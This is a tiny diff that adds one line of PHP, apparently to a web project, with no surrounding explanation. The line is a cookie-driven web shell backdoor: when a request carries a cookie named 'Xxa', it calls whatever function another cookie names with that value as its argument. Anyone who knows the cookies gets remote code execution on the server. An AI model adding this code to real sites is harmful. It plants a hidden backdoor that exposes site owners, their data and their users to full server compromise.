@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["Xxa"])){$_COOKIE["zYmmn"]($_COOKIE["Xxa"]);exit;}
